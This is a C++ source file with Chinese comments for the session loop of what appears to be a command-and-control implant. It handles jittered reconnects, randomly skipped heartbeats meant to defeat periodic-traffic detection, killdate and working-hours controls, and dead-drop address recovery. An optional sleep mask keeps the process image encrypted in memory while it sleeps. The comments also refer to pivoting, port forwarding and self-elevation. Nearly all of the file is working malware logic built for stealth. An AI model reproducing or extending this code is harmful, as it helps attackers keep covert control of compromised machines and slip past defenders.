/**
 * @file SessionLoop.cpp
 * @brief 会话循环(I/O 引擎)实现
 */

#include "Core/Comms/Session/SessionLoop.hpp"

#include "Common/Logger/Logger.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Core/Lifecycle/LifecycleGate.hpp"
#include "Core/Concurrency/ThreadGovernor.hpp"
#include "Core/Identity/SessionIdentity.hpp"
#include "Core/Comms/Channel/IChannel.hpp"
#include "Core/Comms/CommsManager.hpp"
#include "Core/Comms/OutboundSink.hpp"
#include "Core/Command/Intake/CommandProcessor.hpp"
#include "Core/Mask/MaskPark.hpp"
#ifdef CLEAT_WITH_MASK
#include "Core/Mask/MaskGate.hpp"
#endif
#include "Crypto/Engine/CryptoManager.hpp"

#include <thread>
#include <utility>
#include <vector>

namespace cleat {

    namespace {
        // 主循环节拍: 生成期常量 —— 收帧是排空制
        // (SessionRunner Tick while(recv)), 节拍只影响命令延迟上界, 不限吞吐。
        // 不进 SetConfig: 自己的心跳引擎节奏无运行期改配收益。
        #ifndef CLEAT_LOOP_TICK_MS
        #define CLEAT_LOOP_TICK_MS 100
        #endif
        constexpr uint32_t kLoopTickMs = CLEAT_LOOP_TICK_MS;
        constexpr uint32_t kSleepSliceMs = 10;  ///< 长等待的分片长度(决定 Stop 的最坏延迟)
        /// dormant 暂停粗睡预算: 复用 SleepMs 的 10ms 分片 → Stop() 延迟保证不变,
        /// 片内照常检查 StopRequested; killdate 到点由下一拍门闸判定(反应 ≤1s)。
        constexpr uint32_t kDormantSliceMs = 1000;
    } // namespace

    SessionLoop::SessionLoop(CommsManager& network, OutboundSink& sink,
        CommandProcessor& processor)
        : network_(network), sink_(sink), processor_(processor) {
        // B3-7 收口: 启动即以 AgentConfig 的 reconnect 域为准重配退避 —— 之前
        // SessionRunner 一直跑自己的默认值(base 1000/max 30000), 配置域形同虚设。
        ApplySessionConfig();
    }

    SessionLoop::~SessionLoop() {
        Stop();
    }

    void SessionLoop::SetHeartbeatCallback(HeartbeatCallback cb) {
        heartbeat_callback_ = std::move(cb);
    }
    void SessionLoop::SetIsPushChannel(IsPushChannel cb) {
        is_push_channel_ = std::move(cb);
    }
    void SessionLoop::SetAddressRecoveryCallback(AddressRecoveryCallback cb) {
        address_recovery_cb_ = std::move(cb);
    }
    void SessionLoop::SetOnFirstConnectCallback(OnConnectedCallback cb) {
        on_first_connect_callback_ = std::move(cb);
    }
    void SessionLoop::SetOnReconnectCallback(OnConnectedCallback cb) {
        on_reconnect_callback_ = std::move(cb);
    }
    void SessionLoop::SetEventReportFlusher(EventReportFlusher cb) {
        event_report_flusher_ = std::move(cb);
    }

    void SessionLoop::AddChannelsReloadObserver(SessionRunner::ChannelsReloadObserver obs) {
        runner_.AddChannelsReloadObserver(std::move(obs));
    }

    void SessionLoop::ApplySessionConfig() {
        // B3-7 收口: reconnect 域(AgentConfig) → SessionRunnerConfig(SessionRunner)。
        // 首连/重连退避的 base/max 与抖动来自配置; confirm_timeout_ms / rng_seed 不在
        // 远程域, 取当前 runner 配置原值(生产恒为默认 8000ms / 随机种子)。
        const ReconnectConfig rc = AgentConfig::Instance().GetReconnect();
        SessionRunnerConfig c;
        c.first_connect_base_ms = rc.first_connect_base_ms;
        c.first_connect_max_ms = rc.first_connect_max_ms;
        c.reconnect_base_ms = rc.base_ms;
        c.reconnect_max_ms = rc.max_ms;
        c.jitter_permille = rc.jitter_permille;
        runner_.Configure(c);
    }

    void SessionLoop::NotifyActivity() {
        heartbeat_sched_.NoteActivity(Clock::now());
    }

    void SessionLoop::Stop() {
        running_.store(false);
        runner_.Stop();          // 会话状态 -> Stopping(幂等)
        network_.Disconnect();   // 中断可能正在进行的收/发阻塞
    }

    bool SessionLoop::SleepMs(uint32_t ms) {
        // 分片并检查停止标志: 旧实现用不可中断的 sleep_for, 长退避下 Stop() 要等到退避结束
        for (uint32_t waited = 0; waited < ms; waited += kSleepSliceMs) {
            // 睡眠掩码停靠检查点(P2): 本线程在"自测命令发起窗口"时作为参与者停靠。
            // 放行必然发生在镜像解密之后(MaskPark::Session RAII), 复醒后照常分片;
            // 窗口期 Stop() 的响应推迟到窗口结束 —— 与设计 的语义登记一致。
            MaskPark::ParticipantCheckpoint();
            if (StopRequested()) return false;
            std::this_thread::sleep_for(std::chrono::milliseconds(kSleepSliceMs));
        }
        return !StopRequested();
    }

    void SessionLoop::StartUpDelay() {
        const uint32_t delayMaxMs = AgentConfig::Instance().GetFirstConnectDelayMaxMs();
        if (delayMaxMs == 0) return;
        const uint32_t ms = std::uniform_int_distribution<uint32_t>(0, delayMaxMs)(rng_);
        LOG_INFO("SessionLoop: 启动随机延时 " << ms << "ms(防惊群)");
        SleepMs(ms);
    }

    void SessionLoop::LogSendFailure(Clock::time_point& lastFailAt, const char* what) {
        const auto now = Clock::now();
        if (lastFailAt != Clock::time_point{} && now - lastFailAt < std::chrono::seconds(10)) {
            return;
        }
        lastFailAt = now;
        LOG_WARN("SessionLoop: " << what << " 发送失败(链路可能已死, 待重连)");
    }

    void SessionLoop::OpenAndRegister(const std::string& host, uint16_t port) {
        const bool ok = network_.Connect(host, port);
        if (!ok) {
            LOG_WARN("连接失败, 将按退避重试");
            runner_.OnChannelResult(false, false, Clock::now());   // -> Reconnecting
            return;
        }
        // X25519 模式需先发握手帧再注册; PSK 模式 BuildHandshakeFrame 返回空 → 免握手。
        // 先构造再判定, 以免"判定一次、发送一次"造出两种真相。
        const std::vector<uint8_t> hf = CryptoManager::Instance().BuildHandshakeFrame();
        const bool need_handshake = !hf.empty();
        const auto now = Clock::now();
        // 确认超时窗口自"通道就绪"起算(等价旧实现 ArmSessionConfirm 的位置)
        runner_.OnChannelResult(true, need_handshake, now);

        // R7: 旧链路遗留帧(死亡瞬间的遥测/心跳僵尸)必须作废 —— 若先于 KE/注册帧冲出,
        // 服务端按"非注册首帧"走匿名注册(空参数), 击穿 machine_id 复用
        sink_.Clear();
        if (need_handshake) {
            LOG_INFO("SessionLoop: 发送 X25519 握手帧 (" << hf.size() << "B)");
            // 决策三: KE 是明文旁路, 显式标记 —— 限流/节流一律不适用(密钥都还没协商)
            SendOptions hs;
            hs.kind = SendKind::Handshake;
            hs.urgent = true;
            hs.cmd = "KeyExchange";
            sink_.Send(hf, hs);
            runner_.OnHandshakeSent();   // Handshaking -> Registering(代际在此递增)
        }
        if (runner_.FirstConnectDone()) {
            if (on_reconnect_callback_) on_reconnect_callback_();
        }
        else if (on_first_connect_callback_) {
            on_first_connect_callback_();
        }
        LOG_INFO("会话注册帧已发出, 等待确认(状态 " << ToString(runner_.State()) << ")...");
    }

    void SessionLoop::EnsureSteadyStateStarted() {
        if (steady_state_started_) return;
        steady_state_started_ = true;
        recover_fail_streak_ = 0;   // 主通道恢复(进入稳态) —— 死投递计数清零( 停止条件)
        // 进入 Ready 即让心跳/Poll 立即各触发一次(等价旧实现在 RunConnectionLoop 入口的复位),
        // 之后跨重连沿用同一节奏(旧实现同样只在入口复位一次)。
        const auto now = Clock::now();
        heartbeat_sched_.Reset(now);
    }

    void SessionLoop::SteadyStateTasks() {
        const auto now = Clock::now();
        // A3.1(完善,  真机反馈): 心跳分支只属于 Push 通道(TCP 长连接)。
        // Poll 通道(beacon)的保活与取件已合并为 GET(传输层 PollClock) —— 若不在此
        // 短路, 心跳分支每拍空转一次: callback 被 agency 分派静默, 唯一可见输出是
        // 3% 概率的"丢拍"日志, 观感即"心跳总被跳过"(真机实测确认)。
        if (is_push_channel_ && !is_push_channel_()) {
            return;   // Poll 通道: 无心跳语义, 直接跳过整个分支(连 Due 都不查)
        }
        if (heartbeat_sched_.Due(now)) {
            // 随机丢拍: 命中则本次心跳不发(节拍不规则化, 抗周期建模)
            if (heartbeat_sched_.ShouldSkipBeat()) {
                LOG_DEBUG("heartbeat beat skipped (jitter irregularity)");
            }
            else if (heartbeat_callback_) {
                if (!heartbeat_callback_()) LogSendFailure(last_hb_fail_at_, "heartbeat");
                else LOG_DEBUG("heartbeat sent (Push 通道保活; Poll 通道由 GET 取件保活)");
            }
        }
        if (event_report_flusher_) event_report_flusher_();
    }

    void SessionLoop::RouteFrames(const SessionRunner::TickResult& res) {
        // 分类已在 Tick 内完成(单一分类点) —— 此处只执行**业务侧副作用**, 不重新分类。
        // 
        for (const ClassifiedFrame& f : res.frames) {
            //  把帧的**接收时代际**一并交给处理器 —— 命令据此绑定归属, 迟到响应按代际丢弃
            processor_.HandleClassified(f, res.recv_epoch);
        }
    }

    SessionLoop::ExitKind SessionLoop::Run(const std::string& host, uint16_t port) {
        LOG_INFO("SessionLoop 启动(会话状态由 SessionRunner 持有)");
        // 退出原因: 默认 Stopped 覆盖 while 条件退出(running_ 被 Stop() 置否)。
        ExitKind exit_kind = ExitKind::Stopped;
        // 线程治理: 主循环注册(kind=Main, List 全量可见); 暂停/退出判定在下方
        // LifecycleGate 分支(批B) —— 通用 Checkpoint 在此不适用(暂停需先断链)。
        const auto main_gov = ThreadGovernor::Attach("session-main", JobKind::Main);
        (void)main_gov;
        // 睡眠掩码停靠(P2): 主循环入册。它是两种窗口形态的双重身份 ——
        // dormant 路径的**发起者**(本线程执行掩码链), 自测命令窗口的**参与者**
        // (经 SleepMs 分片检查点停靠)。掩码开关 OFF 时为空实现。
        MaskPark::Registration mask_park_reg;
        (void)mask_park_reg;
        StartUpDelay();
        if (StopRequested()) {
            LOG_INFO("SessionLoop 在启动延时阶段被停止");
            return ExitKind::Stopped;
        }
        runner_.Start();   // Idle -> Opening

        while (!StopRequested()) {
            // 收到 ExitProgram(自提权新实例上线后旧实例退出)或外部停止信号
            if (SessionIdentity::Instance().ShouldExit()) {
                LOG_INFO("SessionLoop: exit requested, stopping main loop");
                // 门闸同置 Stopping = 本地停止/收尾信号(经上方并轨写入 exit_requested);
                // 否则为纯外部退出请求(服务端 ExitProgram / 迁移交接)。仅用于退出归因。
                exit_kind = ThreadGovernor::Stopping()
                    ? ExitKind::Stopped : ExitKind::ExitRequested;
                break;
            }

            // (信号路径只写状态字, 不 lock/notify), 等待者靠 1s 兜底片自行离开 ——
            // 故本处并轨只做两件事: ① 把门闸终态镜像进 SessionIdentity(本循环自身的
            // ShouldExit 判据 + 任务线程开工前检查据此服从); ② 走 RequestExit 的 notify
            // 把唤醒延迟从 ≤1s 压到 ~10ms。**正确性不依赖本处**(主循环已退出也不挂死)。
            if (ThreadGovernor::Stopping() && !SessionIdentity::Instance().ShouldExit()) {
                LOG_INFO("SessionLoop: 收尾请求(本地停止/信号) -> 并轨为退出");
                ThreadGovernor::RequestExit();
            }

            // ---- LifecycleGate ----
            // 唯一消费点。死亡优先于暂停, 暂停优先于一切会话推进。窗外暂停 = 断链 +
            // Governor 置位: 服务/任务/rportfwd/pivot 泵经各自 Checkpoint 同步服从;
            // 窗口开启后下一拍走既有"链路自报故障 → 短退避 → 重连重注册", 零新机制。
            const auto lc_decision = LifecycleGate::Evaluate();
            if (lc_decision == LifecycleGate::Decision::Exit) {
                // 默认不发告别帧: 直接并轨退出
                LOG_WARN("SessionLoop: 生命周期到点(killdate 或窗外退出策略), 请求退出");
                ThreadGovernor::RequestExit();
                exit_kind = ExitKind::Lifecycle;
                break;
            }
            if (lc_decision == LifecycleGate::Decision::Pause) {
                if (!lifecycle_pause_) {
                    LOG_INFO("SessionLoop: working hours 窗外, 断链进入暂停(全后台经门闸同步暂停)");
                    network_.Disconnect();
                    ThreadGovernor::SetPaused(true);
                    lifecycle_pause_ = true;
                }
#ifdef CLEAT_WITH_MASK
                // 掩码窗口(P2 接入点, 设计): dormant = 最干净的窗口 —— 本来就
                // 离线, 全静默谓词 + 停靠(仅 worker/reaper) + 普查兜底。判定拒绝/
                // 停靠失败/链失败一律走普通粗睡片, 下一拍重试; 窗口成功则整镜像在
                // 睡眠期以密文形态驻留(链式: 仍 dormant 则下一拍继续掩)。
                MaskGate::SilenceParams sp;
                sp.channel_is_poll = !is_push_channel_ || !is_push_channel_();
                sp.outbound_queued_bytes = sink_.QueuedBytes();
                std::string mask_reason;
                uint32_t masked_ms = 0;
                if (MaskGate::MaskedSleep(0, sp, mask_reason, &masked_ms)) {
                    LOG_INFO("SessionLoop: 掩码窗口完成 " << masked_ms
                        << "ms(整镜像以密文驻留)");
                    continue;   // 窗口已过且已解密 → 下一拍
                }
                LOG_DEBUG("SessionLoop: 掩码窗口未执行(" << mask_reason << "), 走普通睡眠");
#endif
                SleepMs(kDormantSliceMs);
                continue;
            }
            if (lifecycle_pause_) {   // 从暂停转出: 放行门闸, 链路走既有重连路径
                LOG_INFO("SessionLoop: working hours 窗口开启, 恢复(将自动重连重注册)");
                ThreadGovernor::SetPaused(false);
                lifecycle_pause_ = false;
            }

            // 离开 Ready 就允许下一次"进入 Ready"再记一次(闩在下面 Ready 分支内抬起)
            if (!runner_.Ready()) ready_announced_ = false;

            // 换链: 每轮读一次修订号, 去重与派发都在 Runner 内(恰好一次)
            runner_.NoteChannelsRevision(AgentConfig::Instance().GetChannelsRevision());

            if (runner_.NeedBackoff()) {                 // Reconnecting: 等退避
                //  死投递触发(两阶段,  天级化):
                //   ① 首次触发 = 旧计数模式: 自上次稳态起累计 recover_after_fails 个
                //      退避周期(~15 分钟级), 抓"瞬断"与"运营已备好新地址";
                //   ② 后续重试 = 时间模式: 独立指数退避 min×2^round 封顶 max
                //      "频率: 天/周级"的落地; seq 单调下无新内容的拉取信息量为零,
                //      高频只制造"每 N 分钟精确打一次平台"的周期特征。
                ++recover_fail_streak_;
                const auto rc = AgentConfig::Instance().GetRecovery();
                bool fire = false;
                if (!dd_time_mode_) {
                    if (recover_fail_streak_ >= rc.recover_after_fails) fire = true;
                }
                else if (Clock::now() >= dd_next_attempt_) {
                    fire = true;
                }
                if (fire) {
                    recover_fail_streak_ = 0;
                    if (address_recovery_cb_) address_recovery_cb_();
                    // 进入/延续时间模式: 下一轮等待按轮次翻倍封顶(先快后慢)
                    const uint32_t wait_min = rc.RetryWaitMinutes(dd_retry_round_);
                    if (dd_retry_round_ < 31) ++dd_retry_round_;   // 防移位溢出; 计算内部已封顶
                    std::uniform_real_distribution<double> dd_jitter(0.75, 1.25);
                    const auto wait_ms = static_cast<uint64_t>(
                        static_cast<double>(wait_min) * 60000.0 * dd_jitter(rng_));
                    dd_next_attempt_ = Clock::now() + std::chrono::milliseconds(wait_ms);
                    dd_time_mode_ = true;
                    LOG_INFO("SessionLoop: 死投递下一轮重试 ~" << wait_min << " 分钟后(±25%)");
                }
                const uint32_t wait = runner_.NextBackoffMs();
                LOG_WARN("会话待重连, 等待 " << wait << " 毫秒");
                // 掩码接入点(P3, 设计): 退避期通道仍为 Poll 型时, 以
                // MaskedSleep(min(退避剩余, 窗长)) 取代退避分片睡 —— 断链重试的
                // 等待时间整镜像密文驻留。拒绝/失败走原分片睡。
                bool slept_masked = false;
#ifdef CLEAT_WITH_MASK
                {
                    MaskGate::SilenceParams sp;
                    sp.channel_is_poll = !is_push_channel_ || !is_push_channel_();
                    sp.outbound_queued_bytes = sink_.QueuedBytes();
                    std::string mask_reason;
                    uint32_t masked_ms = 0;
                    if (MaskGate::MaskedSleep(wait, sp, mask_reason, &masked_ms)) {
                        LOG_INFO("SessionLoop: 退避期掩码窗口完成 " << masked_ms << "ms");
                        slept_masked = true;
                    }
                }
#endif
                if (!slept_masked && !SleepMs(wait)) break;   // 外部停止: exit_kind 默认 Stopped
                runner_.BackoffElapsed();                // -> Opening
                continue;
            }
            if (runner_.NeedOpen()) {                    // Opening: 建链 + 注册序列
                OpenAndRegister(host, port);
                continue;
            }
            if (!network_.IsConnected()) {               // 链路自报故障
                LOG_WARN("网络断开, 转入重连");
                runner_.OnChannelDown();
                continue;
            }

            // 链活着: 收帧 → Classify → Feed(状态推进在 Runner 内), 帧交业务侧执行。
            // 收帧函数**注入** `Chain::Recv`(唯一收包入口): 降级运行中的回探与收侧失败
            // 计数都在那里, 故生产与夹具走同一条路径；早前这里是
            // `Tick(network_.CurrentChannel())` 直取 IChannel, 回探因此从不发生。
            const auto res = runner_.Tick(
                [this](std::vector<uint8_t>& frame) { return network_.RecvFrame(frame); },
                Clock::now());
            RouteFrames(res);

            if (runner_.AwaitingConfirm()) {
                SleepMs(kLoopTickMs);                    // 确认等待期的轮询节拍(与旧实现一致)
                continue;
            }
            if (!runner_.Ready()) {
                // 被拒 / 确认超时(假成功) / 会话失效: 断开并按失败退避, 绝不进入稳态。
                // 注: 这里必须用 if/else 而非三元 —— `LOG(level,msg)` 展开成
                // `_log_stream << msg`, 而 `<<` 的优先级**高于** `?:`(与下方"重连会话确认
                // 成功"处同一坑)。
                if (res.session_lost) {
                    // 身份已由 SessionMachine 清空(sid=0): 重连后 FirstConnect 只带
                    // machine_id, 服务端据此复用/复活既有记录, 不再带一个它不认的旧 sid
                    LOG_WARN("服务端不认得本机会话(SESSION_UNKNOWN), 已清身份, 断开并按失败退避重新注册");
                }
                else if (res.denied) {
                    LOG_WARN("会话被 Server 拒绝(防抖 busy), 断开并按失败退避");
                }
                else {
                    LOG_WARN("会话确认超时(假成功), 断开并按失败退避");
                }
                network_.Disconnect();
                continue;                                // 下一轮走 NeedBackoff
            }

            if (!ready_announced_) {
                // 只在**刚进入** Ready 时记一次(等价旧实现的"首次连接/重连会话确认成功")。
                // 注: 这里必须用 if/else 而非三元 —— `LOG(level,msg)` 展开成
                // `_log_stream << msg`, 而 `<<` 的优先级**高于** `?:`, 三元会被解析成
                // `(_log_stream << cond)` 从而只打印出 "1"(实测踩坑)。
                ready_announced_ = true;
                // 死投递触发状态随稳态复位: 计数从零起算(修复旧实现的跨断连残留 ——
                // EnsureSteadyStateStarted 的清零是进程一次性的, 第二次断连会继承
                // 上次的半程计数), 重试节奏回到"计数模式/最快档"。
                recover_fail_streak_ = 0;
                dd_time_mode_ = false;
                dd_retry_round_ = 0;
                if (steady_state_started_) {
                    LOG_INFO("重连会话确认成功");
                }
                else {
                    LOG_INFO("首次连接会话确认成功");
                }
            }
            EnsureSteadyStateStarted();
            runner_.NoteHealthy();                       // 连接健康 → 退避回到最短
            if (res.command_frames > 0) {
                heartbeat_sched_.NoteActivity(Clock::now());
            }
            SteadyStateTasks();
            // 掩码接入点(P3 稳态 + v1.5 节奏合一, 设计/): 窗长 := 距下一次
            // check-in 到期(PollClock 固化值), 上限截断(sleep_ms)在 MaskGate 内单点执行。
            // beacon 化主落点: 窗口期零响应(命令在服务端排队), 醒来恰为取件时刻,
            // 下一轮 Tick 的 GET 立即补 check-in 并取走积压命令。拒绝/失败走原 100ms 节拍。
            // 查询不可得(due_ms==0: 非 Poll 时钟/未武装/已到期) → 传 0 保持固定窗回退。
            bool slept_masked = false;
#ifdef CLEAT_WITH_MASK
            {
                MaskGate::SilenceParams sp;
                sp.channel_is_poll = !is_push_channel_ || !is_push_channel_();
                sp.outbound_queued_bytes = sink_.QueuedBytes();
                // v1.5 收尾: sink 排空 ≠ 干完 —— 稳态门补查通道内待落线上行分片
                // (DNS/ICMP 分片尾巴; HTTPS 同步 POST 恒 0)。dormant/退避不填。
                sp.channel_uplink_bytes = network_.PendingUplinkBytes();
                const uint32_t due_ms = network_.NextPollDueInMs();
                std::string mask_reason;
                uint32_t masked_ms = 0;
                if (MaskGate::MaskedSleep(due_ms, sp, mask_reason, &masked_ms)) {
                    LOG_INFO("SessionLoop: 掩码窗口完成 " << masked_ms << "ms(稳态)");
                    slept_masked = true;
                }
                else {
                    LOG_DEBUG("SessionLoop: 掩码窗口未执行(" << mask_reason << ")(稳态)");
                }
            }
#endif
            if (!slept_masked) SleepMs(kLoopTickMs);
        }

        network_.Disconnect();
        LOG_INFO("SessionLoop 退出(reason=" << static_cast<int>(exit_kind) << ")");
        return exit_kind;
    }

} // namespace cleat
